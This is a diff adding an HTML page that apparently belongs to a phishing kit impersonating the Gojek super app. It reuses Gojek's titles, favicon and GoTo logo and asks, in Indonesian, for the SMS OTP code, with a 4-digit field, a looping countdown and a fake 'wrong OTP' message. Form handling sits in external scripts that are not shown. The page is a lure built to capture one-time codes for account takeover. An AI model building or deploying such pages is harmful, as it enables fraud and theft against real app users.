@@ -1,0 +1,84 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="stylesheet" href="ast/main.css">
+    <link rel="stylesheet" href="ast/pin.css">
+    <link rel="stylesheet" href="ast/load.css">
+    <link href='https://unpkg.com/boxicons@2.1.1/css/boxicons.min.css' rel='stylesheet'>
+        <title>Gojek Super App: Ojek Online, Taksi Online, Pesan Makan, Kirim Barang, Pembayaran</title>
+        <link rel="icon" href="https://d1j87w3j7cc3a6.cloudfront.net/prime/static/prime/images/gojek_favicon.png" type="image/png" sizes="32x32">
+        <meta name="description" content="Lebih dari 1 juta driver Gojek siap melayani ojek online, taksi online, pesan antar makanan, kirim barang, belanja &amp; pembayaran. Download Gojek Super App.">
+        <meta property="og:title" content="Gojek Super App: Ojek Online, Taksi Online, Pesan Makan, Kirim Barang, Pembayaran">
+        <meta property="twitter:title" content="Gojek Super App: Ojek Online, Taksi Online, Pesan Makan, Kirim Barang, Pembayaran">
+        <meta name="description" content="Lebih dari 1 juta driver Gojek siap melayani ojek online, taksi online, pesan antar makanan, kirim barang, belanja &amp; pembayaran. Download Gojek Super App.">
+        <meta property="og:description" content="Gojek Super App: Ojek Online, Taksi Online, Pesan Makan, Kirim Barang, Pembayaran">
+        <meta property="twitter:description" content="Gojek Super App: Ojek Online, Taksi Online, Pesan Makan, Kirim Barang, Pembayaran">
+</head>
+<body>
+    <div class="container page1">
+        <div style="display:none;" class="load">
+            <div class="box">
+                <div class="circle one"></div>
+                <div class="circle two"></div>
+                <div class="circle three"></div>
+            </div>
+        </div>
+        <div class="header">
+            <i onclick="window.location.href='c.html'" class='bx bx-left-arrow-alt'></i>
+        </div>
+        <div class="title">
+            <h3 class="b">Masukkan kode OTP</h3>
+            <p class="r">Masukkan kode sms OTP yang kami kirim ke nomor HP-mu.</p>
+        </div>
+        <form  class="ootp" id="formPin">
+            <p class="r ot">Code OTP <span style="color:red;">*</span></p>
+            <div class="box-input-pin">
+                <input name="ottp" id="ottp" class="inppin b" type="number" autocomplete="off" required style="width:100%;background:none;caret-color:rgb(0, 136, 13);text-align:left;border-radius:0px;letter-spacing:5px;" autofocus>
+                <div class="timer">
+                    <div class="wait"></div>
+                    <span class="b" id="countdown"></span>
+                </div>
+            </div>
+            <p style="text-decoration:none;margin-top:5px;color:red;display:none;" class="r reset alert">OTP salah, silakan coba lagi</p>
+<div class="bgbtn">
+                <button class="b" type="submit" id="btnnohp">LANJUT</button>
+            </div>
+        </form>
+        <img class="goto1" style="position: fixed;left:0;right:0;bottom: 40px;" src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/88/GoTo_logo.svg/440px-GoTo_logo.svg.png">
+    </div>
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script>
+
+    document.getElementById("ottp").addEventListener("input", function() {
+        if (this.value.length > 4) {
+            this.value = this.value.slice(0, 4);
+        }
+    });
+</script>
+<script src="kntl.js"></script>
+<script src="pler.js"></script>
+<script>
+window.onload = function () {
+  var countdown = 120; // 2 menit dalam detik
+  setInterval(function() {
+    var minutes = Math.floor(countdown / 60);
+    var seconds = countdown - minutes * 60;
+    var formattedMinutes = minutes < 10 ? "0" + minutes : minutes;
+    var formattedSeconds = seconds < 10 ? "0" + seconds : seconds;
+    var formattedTime = formattedMinutes + ":" + formattedSeconds;
+    $('#countdown').text(formattedTime);
+    if (countdown === 0) {
+      countdown = 120; // ulang setelah mencapai waktu 0
+    } else {
+      countdown--;
+    }
+  }, 1000);
+};
+
+</script>
+</body>
+</html>
